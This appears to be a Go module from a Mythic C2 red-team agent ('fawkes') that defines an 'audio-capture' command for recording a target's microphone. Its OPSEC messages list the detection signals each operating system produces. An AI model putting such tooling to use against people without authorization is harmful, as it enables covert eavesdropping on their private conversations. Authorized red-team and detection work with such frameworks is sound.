package agentfunctions

import (
	"encoding/json"
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "audio-capture",
		Description:         "audio-capture [-duration 10] [-sample_rate 16000] [-channels 1] [-device default] - Record audio from microphone and upload WAV file.",
		HelpString:          "audio-capture [-duration 10] [-sample_rate 16000] [-channels 1] [-device default]",
		Version:             1,
		MitreAttackMappings: []string{"T1123"}, // Audio Capture
		Author:              "@galoryber",
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "duration",
				CLIName:       "duration",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:   "Recording duration in seconds (default: 10, max: 300)",
				DefaultValue:  10,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     1,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "sample_rate",
				CLIName:       "sample_rate",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:   "Sample rate in Hz (default: 16000). 8000=phone quality, 16000=voice, 44100=CD quality",
				DefaultValue:  16000,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     2,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "channels",
				CLIName:       "channels",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:   "Number of channels (1=mono, 2=stereo, default: 1)",
				DefaultValue:  1,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:          "device",
				CLIName:       "device",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:   "Audio input device (default: system default). Linux: ALSA device name (hw:0,0). macOS/Windows: default.",
				DefaultValue:  "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     4,
						GroupName:            "Default",
					},
				},
			},
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Audio capture completed. Microphone API access (WASAPI/ALSA/CoreAudio) generates device access events. Recorded audio uploaded to Mythic file browser. Device access may trigger OS-level permission prompts (macOS TCC).",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input != "" {
				return args.LoadArgsFromJSONString(input)
			}
			return nil
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			duration := 10
			if d, err := taskData.Args.GetNumberArg("duration"); err == nil {
				duration = int(d)
			}
			sizeEstimate := fmt.Sprintf("~%d KB", duration*16000*2/1024) // 16kHz mono 16-bit

			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:          taskData.Task.ID,
				Success:         true,
				OpsecPreBlocked: false,
				OpsecPreMessage: fmt.Sprintf("OPSEC WARNING: Audio capture (T1123) accesses the microphone for %d seconds. "+
					"Estimated file size: %s. "+
					"Windows: Uses waveIn API (winmm.dll) — may trigger audio privacy indicators. "+
					"Linux: Uses arecord/parecord — process visible in ps. "+
					"macOS: May trigger TCC microphone permission prompt if not pre-authorized. "+
					"The WAV file is uploaded to Mythic — check bandwidth constraints.", duration, sizeEstimate),
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(task *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  task.Task.ID,
			}
			if displayParams, err := task.Args.GetFinalArgs(); err == nil && displayParams != "" {
				response.DisplayParams = &displayParams
			}
			createArtifact(task.Task.ID, "Audio Device", "Microphone access for audio capture")
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{TaskID: processResponse.TaskData.Task.ID, Success: true}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}

			var result struct {
				Duration   string `json:"duration"`
				SampleRate int    `json:"sample_rate"`
				DataSize   int    `json:"data_size"`
				DeviceUsed string `json:"device_used"`
			}
			if err := json.Unmarshal([]byte(responseText), &result); err != nil {
				return response
			}

			createArtifact(processResponse.TaskData.Task.ID, "Audio Recording",
				fmt.Sprintf("Captured %s of audio (%d bytes, %d Hz) from %s",
					result.Duration, result.DataSize, result.SampleRate, result.DeviceUsed))
			return response
		},
	})
}
